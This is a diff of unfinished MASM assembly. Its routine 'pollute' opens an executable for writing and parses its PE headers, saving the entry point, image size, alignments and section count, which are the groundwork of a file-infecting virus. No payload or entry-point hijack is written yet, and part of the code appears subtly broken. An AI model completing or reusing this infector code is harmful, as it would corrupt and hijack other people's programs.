@@ -29,7 +29,19 @@ tailleSection dd ?
 executableHandle HANDLE ?
 executableMap HANDLE ?
 executableEnMemoire LPVOID ?
-infosExecutable IMAGE_DOS_HEADER  <>  
+;infosExecutable IMAGE_DOS_HEADER  <>  
+;PinfosExecutable dd ?
+
+
+ptrEntryPoint  dd ?
+pointeurSizeOfImage dd ?
+sectionAlignment dd ?
+fileAlignment dd ?
+sauvegardeEntryPoint dd ?
+pointeurNombreDeSection dd ?
+nombreDeSection dw ?
+
+infosSection dw ?
 
 .code
 	
@@ -60,7 +72,8 @@ invoke ExitProcess, 1
 pollute proc   filename1 : DWORD
 
 
-invoke crt_printf, filename1
+; Affiche le nom du fichier
+;invoke crt_printf, filename1
 
 ; Opens file for both read and write                                                                                                                                                                   
 mov	eax, GENERIC_WRITE
@@ -84,13 +97,90 @@ mov executableEnMemoire, eax
 cmp eax, NULL
 je exiterror
 
-;mov eax, 0[executableEnMemoire]
-;mov eax, [eax]
-assume eax:ptr IMAGE_DOS_HEADER
-mov infosExecutable.e_magic , ax 
-invoke crt_printf,  offset varPutInt,  [eax].e_magic
 
-invoke crt_printf,  offset varPutInt,  IMAGE_DOS_SIGNATURE
+;invoke crt_printf,  offset varPutInt,  [eax].e_lfanew
+
+
+;invoke crt_memcpy, infosExecutable, eax,  sizeof IMAGE_DOS_HEADER
+;mov PinfosExecutable, eax
+
+ ;ebx  <=> PIMAGE_DOS_HEADER
+mov ebx, eax
+assume  ebx: ptr IMAGE_DOS_HEADER
+
+cmp [ebx].e_magic, IMAGE_DOS_SIGNATURE
+jne exiterror
+
+
+
+;infosPE = (PIMAGE_NT_HEADERS)((PUCHAR)infosExecutable + infosExecutable->e_lfanew);
+; ebx += [ebx].e_lfanew
+;; on pointe vers IMAGE_NT_HEADER
+add ebx, [ebx].e_lfanew
+assume ebx: ptr IMAGE_NT_HEADERS
+
+cmp [ebx].Signature,  IMAGE_NT_SIGNATURE
+jne exiterror
+
+
+;PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
+; esi = OptionalHeader
+ lea esi, [ebx].OptionalHeader
+ assume esi :ptr IMAGE_OPTIONAL_HEADER
+ 
+;PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
+mov ptrEntryPoint, esi
+add ptrEntryPoint, 10h
+
+;PDWORD pointeurSizeOfImage = &infosPE->OptionalHeader.SizeOfImage;
+mov pointeurSizeOfImage, esi
+add pointeurSizeOfImage, 38h
+
+;DWORD sectionAlignment = infosPE->OptionalHeader.SectionAlignment;
+mov eax,  [esi].SectionAlignment
+mov sectionAlignment, eax
+
+;DWORD fileAlignment = infosPE->OptionalHeader.FileAlignment;
+mov eax,  [esi].FileAlignment
+mov fileAlignment, eax
+
+;DWORD sauvegardeEntryPoint = infosPE->OptionalHeader.AddressOfEntryPoint;
+mov eax,  [esi].AddressOfEntryPoint
+mov sauvegardeEntryPoint, eax
+
+
+
+
+; edi = FileHeader
+lea edi, [ebx].FileHeader
+ assume edi :ptr IMAGE_FILE_HEADER
+ invoke crt_printf, offset varPutInt,  [edi].NumberOfSections
+
+;PWORD pointeurNombreDeSection = &infosPE->FileHeader.NumberOfSections;
+mov pointeurNombreDeSection, edi
+add pointeurNombreDeSection, 02h
+
+;WORD nombreDeSection = &infosPE->FileHeader.NumberOfSections;
+mov ax, [edi].NumberOfSections
+mov nombreDeSection, ax
+
+;invoke crt_printf, offset varPutInt,  eax
+
+;mov eax, pointeurNombreDeSection
+;mov eax, [eax]
+;push ax
+;push offset varPutInt
+;call crt_printf
+;invoke crt_printf, offset varPutInt,  nombreDeSection
+    
+
+;    PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS));
+;    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );
+
+mov infosSection, ebx
+;add infoSection, sizeof IMAGE_NT_HEADERS
+;mov eax, 
+;mul eax, 
 
 
 ret
